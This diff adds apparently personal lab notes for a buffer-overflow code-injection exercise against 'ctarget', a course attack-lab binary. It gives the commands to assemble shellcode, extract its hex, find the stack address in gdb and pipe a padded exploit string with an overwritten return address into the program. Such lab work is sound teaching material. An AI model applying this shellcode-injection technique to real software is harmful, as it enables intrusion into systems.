@@ -1,0 +1,24 @@
+1) Write shellcode (2exploit.asm)
+	* assemble and link: 
+	** nasm -f elf64 exploit.asm
+	** ld exploit.o -o exploit
+	* verify shellcode works using gdb
+2) get hex from exploit binary
+	* objdump -d 2exploit
+	* copy and paste to text doc
+	* remove everything except hex
+3) hex2raw < 2exploithex.txt > 2exploitraw.txt
+4) get address of stack
+	* in gdb:
+	** br right after Gets() instruction in getbuf()
+	** x $rsp = 0x55614128
+5) Craft exploit string
+	* must adjust buffer padding (As) for size of the shellcode
+	** wc 2exploitraw.txt
+	** 40 - 20 = 20
+	* `python -c "sh=open('2exploitraw.txt').read(); print 'echo ' + sh + 'A'*20+ '\x28\x41\x61\x55'"` | ./ctarget -q
+
+1) Assemble and Link:
+   * nasm -f elf64 exploit.asm
+   * ld exploit.o -o exploit
+   * verify shellcode works using gdb
